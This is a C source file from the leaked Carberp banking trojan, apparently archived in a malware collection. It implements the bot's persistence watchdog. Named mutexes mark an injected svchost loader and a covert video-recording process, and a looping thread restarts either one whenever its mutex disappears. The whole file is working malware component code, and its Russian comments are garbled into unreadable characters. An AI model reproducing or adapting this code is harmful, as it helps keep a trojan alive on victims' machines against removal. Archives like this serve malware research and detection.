/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */

#include <windows.h>

#include"KeepAlive.h"
#include "GetApi.h"
#include "Strings.h"
#include "Utils.h"
#include "Inject.h"
#include "Main.h"

//----------------------------------------------------------------------------

const static char Mutex_SVChost[] = {'k', 'p', '_', 's', 'v', 'c', '_', 'm', 't',  0};
const static char* Mutex_VideoProcess = "kp_videoprocess";

//-----------------------------------------------------------------------------

PCHAR GetKeepAliveMutexName(DWORD Process)
{
	// ������� ���������� ��� ������� ��� ������������ ��������
	switch (Process) {
    	case PROCESS_SVCHOST: return (PCHAR)Mutex_SVChost;
		case PROCESS_VIDEO: return (PCHAR)Mutex_VideoProcess;
	}
	return NULL;
}
//-----------------------------------------------------------------------------

void KeepAliveRestartProcess(DWORD ProcessNomber)
{
	// ������� ������������� ��������� �������
	switch (ProcessNomber) {
		case PROCESS_SVCHOST: RunLoaderRoutine(); /*MegaJump(LoaderRoutine);*/ break; // ������������� ������

		#ifdef VideoRecorderH
		case PROCESS_VIDEO: RunVideoProcess(); break;
		#endif
	}
}
//-----------------------------------------------------------------------------

DWORD KeepAliveCheckProcessThread(LPVOID ProcessNomber)
{
	// ����� �������� ����� ��������

	PCHAR MutexName = GetKeepAliveMutexName((DWORD)ProcessNomber);
	if (MutexName == NULL) return 0;

	// ��������� ����������� ���� �������� ������������� �������
	// ���������� ������� ��������, ��� ������� ��������� ������
	// "����" � ������� �����������

    const static DWORD MinInterval = 60000;

	DWORD FailedCount  = 0; // ���������� ����������� ������� �������� �������
	DWORD RestartCount = 0; // ���������� ������������ � ���������� ������ ����������
	DWORD RestartTime  = 0;  // ����� ������ �����������



	while (true)
	{
		// ��������� ������
		HANDLE Handle = (HANDLE)pOpenMutexA(MUTEX_ALL_ACCESS, false, MutexName);
		if (Handle != NULL)
		{
			// ������ ����������.
			// �������� ������� ��������
		   FailedCount = 0;

           pCloseHandle(Handle);
		}
		else
		{
			// ������ �����������, ��������� ���� ��� ���������� ��������
			FailedCount++;

			if (FailedCount >= 5)
			{
				// ������������� �������

				FailedCount = 0;
				KeepAliveRestartProcess((DWORD)ProcessNomber);

				// ��������� ����� ��������
				DWORD NewTime = (DWORD)pGetTickCount();
				if (RestartTime != 0)
				{
					if ((NewTime - RestartTime) <= MinInterval)
					{
						RestartCount++;
						if (RestartCount >= 3)
						{
							// ������� �� �������� � ����� ������.
							// �� ��������� �������� �� �� � �������
							// ������������ ���������� ���������� �� �����������
							// ��������
							return 0;
                        }
					}
					else
					{
						RestartTime  = 0;
						RestartCount = 0; // �������� ������ ������� �����������
					}
				}

				RestartTime = NewTime;
            }
		}
		// ���������������� �����
        pSleep(2000);
	}
}
//-----------------------------------------------------------------------------

bool KeepAliveInitializeProcess(DWORD ProcessNomber)
{
	//  ������� �������������� ������� �������� ������ ����������
	//  ��������. ���������� �� �������� �� ������� ����� �������
	//  ����������
	PCHAR MutexName = GetKeepAliveMutexName(ProcessNomber);
	if (MutexName == NULL) return false;

    HANDLE Handle = (HANDLE)pCreateMutexA(NULL, false, MutexName);

    return Handle != NULL;
}
//-----------------------------------------------------------------------------

void KeepAliveCheckProcess(DWORD ProcessNomber)
{
	//  ������� ��������� ����� �������� �� ������ ���������� ��������
	//  ���������� �� ���������� ��������

	if (GetKeepAliveMutexName(ProcessNomber) != NULL)
		StartThread(KeepAliveCheckProcessThread, (LPVOID)ProcessNomber);
}
